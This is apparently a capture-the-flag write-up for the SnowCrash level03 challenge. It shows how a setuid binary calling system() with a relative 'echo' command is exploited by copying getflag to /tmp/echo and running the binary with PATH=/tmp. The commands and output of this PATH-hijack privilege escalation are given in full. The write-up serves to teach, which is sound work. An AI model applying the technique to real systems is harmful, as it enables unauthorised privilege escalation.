# Snowcrash03

Ok this time we have a binary that begs us to exploit it.

```sh
ls -l
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
./level03
Exploit me
```

We can see that the binary is owned by the flag03 account and has a suid flag, meaning that if we run the binary, it will be ran with the flag account permissions.

We can try looking at the binary in ltrace before starting gdb.

```bash
level03@SnowCrash:~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                            = 2003
geteuid()                                                            = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                  = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                  = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                               = 0
+++ exited (status 0) +++
```

Ok so we have a system call, it will run the command inside as flag03.
It also uses /env binary, and we have access to the env.

Knowing thanks to minishell, that the env is used to determine where are the programs, more precisely the PATH variable, we should be able to do something.

```bash
~$ env PATH=/tmp ./level03
/usr/bin/env: echo: No such file or directory
```
By doing this, the system call doesnt find echo.
But what if it found it somehow ?

```bash
~$ cp $(which getflag) /tmp/echo
~$ env PATH=/tmp ./level03
Check flag.Here is your token : XXXXXXXXXXXXXXXXXX
```

So we basically tricked flag03 into running getflag for us, no need to log into flag03
